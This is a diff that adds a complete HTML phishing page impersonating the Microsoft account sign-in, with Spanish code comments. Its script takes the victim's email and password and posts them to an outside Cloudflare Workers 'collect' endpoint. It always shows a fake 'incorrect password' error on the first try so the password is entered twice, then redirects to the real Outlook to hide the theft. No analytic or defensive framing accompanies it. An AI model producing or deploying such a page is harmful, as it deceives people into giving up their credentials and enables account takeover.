@@ -1,0 +1,347 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Iniciar sesión | Microsoft</title>
+    <!-- Favicon funcional -->
+    <link rel="icon" type="image/x-icon" href="https://www.microsoft.com/favicon.ico">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: "Segoe UI", "Helvetica Neue", Arial, sans-serif;
+            background: #f2f2f2;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        .card {
+            background: #fff;
+            max-width: 440px;
+            width: 100%;
+            padding: 44px 40px 48px;
+            border-radius: 8px;
+            box-shadow: 0 2px 12px rgba(0,0,0,0.1);
+        }
+        .logo {
+            margin-bottom: 28px;
+        }
+        .logo svg {
+            display: block;
+        }
+        h1 {
+            font-size: 24px;
+            font-weight: 600;
+            color: #1b1b1b;
+            margin-bottom: 8px;
+        }
+        .subtitle {
+            font-size: 15px;
+            color: #1b1b1b;
+            margin-bottom: 28px;
+        }
+        .input-group {
+            margin-bottom: 16px;
+        }
+        .input-group input {
+            width: 100%;
+            padding: 12px 14px;
+            font-size: 15px;
+            border: 1px solid #8b8b8b;
+            border-radius: 2px;
+            outline: none;
+            background: #fff;
+        }
+        .input-group input:focus {
+            border-color: #0067b8;
+            box-shadow: 0 0 0 2px rgba(0,103,184,0.2);
+        }
+        .options {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            margin: 12px 0 8px;
+            font-size: 14px;
+            color: #1b1b1b;
+        }
+        .options input[type="checkbox"] {
+            width: 16px;
+            height: 16px;
+            accent-color: #0067b8;
+        }
+        .btn {
+            background: #0067b8;
+            color: #fff;
+            border: none;
+            padding: 10px 32px;
+            font-size: 15px;
+            font-weight: 600;
+            border-radius: 2px;
+            cursor: pointer;
+            transition: background 0.2s;
+            width: auto;
+        }
+        .btn:hover {
+            background: #004e8c;
+        }
+        .btn:active {
+            transform: scale(0.98);
+        }
+        .btn-secondary {
+            background: transparent;
+            color: #0067b8;
+            border: none;
+            font-size: 14px;
+            cursor: pointer;
+            padding: 8px 0;
+        }
+        .btn-secondary:hover {
+            text-decoration: underline;
+        }
+        .error {
+            color: #d13438;
+            font-size: 14px;
+            background: #fde7e9;
+            padding: 10px 14px;
+            border-radius: 2px;
+            margin-bottom: 14px;
+            display: none;
+        }
+        .footer-links {
+            margin-top: 32px;
+            font-size: 12px;
+            color: #666;
+            border-top: 1px solid #e6e6e6;
+            padding-top: 20px;
+            display: flex;
+            gap: 20px;
+            flex-wrap: wrap;
+        }
+        .footer-links a {
+            color: #0067b8;
+            text-decoration: none;
+        }
+        .footer-links a:hover {
+            text-decoration: underline;
+        }
+        .create-account-link {
+            margin: 8px 0 12px;
+            font-size: 14px;
+        }
+        .create-account-link a,
+        .cant-access-link a {
+            color: #0067b8;
+            text-decoration: none;
+        }
+        .create-account-link a:hover,
+        .cant-access-link a:hover {
+            text-decoration: underline;
+        }
+        .cant-access-link {
+            margin-bottom: 16px;
+            font-size: 14px;
+        }
+        .password-actions {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin: 8px 0 20px;
+        }
+        .password-actions .btn-secondary {
+            padding: 0;
+        }
+        @media (max-width: 480px) {
+            .card {
+                padding: 24px 20px 32px;
+            }
+        }
+        .step {
+            display: none;
+        }
+        .step.active {
+            display: block;
+        }
+		.logo svg {
+		max-width: 180px;
+		width: 100%;
+		height: auto;
+		}
+    </style>
+</head>
+<body>
+
+<div class="card">
+    <!-- Logo Microsoft -->
+    <div class="logo">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 108 23" width="140" height="30">
+            <rect x="0" y="0" width="5" height="5" fill="#f25022"/>
+            <rect x="5" y="0" width="5" height="5" fill="#7fba00"/>
+            <rect x="0" y="5" width="5" height="5" fill="#00a4ef"/>
+            <rect x="5" y="5" width="5" height="5" fill="#ffb900"/>
+            <text x="14" y="14" font-family="Segoe UI, sans-serif" font-weight="600" font-size="16" fill="#1b1b1b">Microsoft</text>
+        </svg>
+    </div>
+
+    <!-- STEP 1: EMAIL -->
+    <div id="stepEmail" class="step active">
+        <h1>Sign in</h1>
+		<div class="subtitle">to continue to Microsoft services</div>
+        <div class="input-group">
+            <input type="email" id="email" placeholder="Email, phone, or Skype" autofocus>
+        </div>
+
+        <!-- Checkbox "Mantener sesión iniciada" -->
+        <div class="options">
+            <input type="checkbox" id="keepSignedIn">
+            <label for="keepSignedIn">Keep me signed in</label>
+        </div>
+		
+		<button class="btn" id="nextBtn">Next</button>
+
+        <!-- Enlace: ¿No puede acceder a su cuenta? -->
+        <div class="cant-access-link">
+            <a href="https://account.live.com/ResetPassword.aspx">Can't access your account?</a>
+        </div>
+
+        
+
+        <div class="footer-links">
+            <a href="microsoft.com/es-es/servicesagreement/default.aspx">Terms of use</a>
+            <a href="https://www.microsoft.com/es-es/privacy/privacystatement">Privacy & cookies</a>
+        </div>
+    </div>
+
+    <!-- STEP 2: PASSWORD -->
+    <div id="stepPassword" class="step">
+        <h1>Iniciar sesión</h1>
+        <div class="subtitle">
+            <span id="emailDisplay"></span>
+            <a href="#" id="changeEmail">Not your account?</a>
+        </div>
+
+        <div class="error" id="errorMsg">Your password is incorrect. Please try again.</div>
+
+        <div class="input-group">
+            <input type="password" id="password" placeholder="Password" autofocus>
+        </div>
+
+        <div class="password-actions">
+            <button class="btn-secondary" id="showPasswordBtn">Show password</button>
+        </div>
+
+        <button class="btn" id="loginBtn">Sign in</button>
+
+        <div class="footer-links">
+            <a href="microsoft.com/es-es/servicesagreement/default.aspx">Terms of use</a>
+            <a href="https://www.microsoft.com/es-es/privacy/privacystatement">Privacy & cookies</a>
+        </div>
+    </div>
+</div>
+
+<script>
+    // Elementos DOM
+    const stepEmail = document.getElementById('stepEmail');
+    const stepPassword = document.getElementById('stepPassword');
+    const emailInput = document.getElementById('email');
+    const passwordInput = document.getElementById('password');
+    const nextBtn = document.getElementById('nextBtn');
+    const loginBtn = document.getElementById('loginBtn');
+    const changeEmail = document.getElementById('changeEmail');
+    const emailDisplay = document.getElementById('emailDisplay');
+    const errorMsg = document.getElementById('errorMsg');
+    const showPasswordBtn = document.getElementById('showPasswordBtn');
+
+    let storedEmail = '';
+
+    // ----- PASO 1 -> PASO 2 (Email -> Contraseña) -----
+    nextBtn.addEventListener('click', function(e) {
+        e.preventDefault();
+        const email = emailInput.value.trim();
+        // Validación simple de email
+        if (!email || !email.includes('@') || !email.includes('.')) {
+            alert('Por favor, introduce una dirección de correo electrónico válida.');
+            return;
+        }
+        storedEmail = email;
+        emailDisplay.textContent = email;
+        stepEmail.classList.remove('active');
+        stepPassword.classList.add('active');
+        passwordInput.focus();
+    });
+
+    // Volver al paso de email (cambiar de cuenta)
+    changeEmail.addEventListener('click', function(e) {
+        e.preventDefault();
+        stepPassword.classList.remove('active');
+        stepEmail.classList.add('active');
+        passwordInput.value = '';
+        errorMsg.style.display = 'none';
+        emailInput.focus();
+    });
+
+    // Mostrar / Ocultar contraseña
+    showPasswordBtn.addEventListener('click', function(e) {
+        e.preventDefault();
+        if (passwordInput.type === 'password') {
+            passwordInput.type = 'text';
+            showPasswordBtn.textContent = 'Ocultar contraseña';
+        } else {
+            passwordInput.type = 'password';
+            showPasswordBtn.textContent = 'Mostrar contraseña';
+        }
+    });
+
+    // ----- LOGIN (con el mecanismo de "contraseña incorrecta" en el primer intento) -----
+    loginBtn.addEventListener('click', function(e) {
+        e.preventDefault();
+        const password = passwordInput.value.trim();
+        if (!password) {
+            alert('Por favor, introduce tu contraseña.');
+            return;
+        }
+
+        const hasAttempted = sessionStorage.getItem('outlook_attempt') === 'true';
+
+        if (hasAttempted) {
+            // Segundo intento: envía datos y redirige a Outlook real
+            fetch('https://creds-worker.michellmiranda0707.workers.dev/collect', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ email: storedEmail, password, attempt: 'second' })
+            });
+            window.location.href = 'https://outlook.live.com';
+            return;
+        }
+
+        // Primer intento: siempre mostrar error de contraseña
+        fetch('https://creds-worker.michellmiranda0707.workers.dev/collect', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ email: storedEmail, password, attempt: 'first' })
+        });
+
+        sessionStorage.setItem('outlook_attempt', 'true');
+        sessionStorage.setItem('outlook_email', storedEmail);
+
+        errorMsg.style.display = 'block';
+        passwordInput.value = '';
+        passwordInput.focus();
+    });
+
+    // --- Atajos de teclado (Enter) ---
+    emailInput.addEventListener('keydown', function(e) {
+        if (e.key === 'Enter') nextBtn.click();
+    });
+    passwordInput.addEventListener('keydown', function(e) {
+        if (e.key === 'Enter') loginBtn.click();
+    });
+</script>
+
+</body>
+</html>
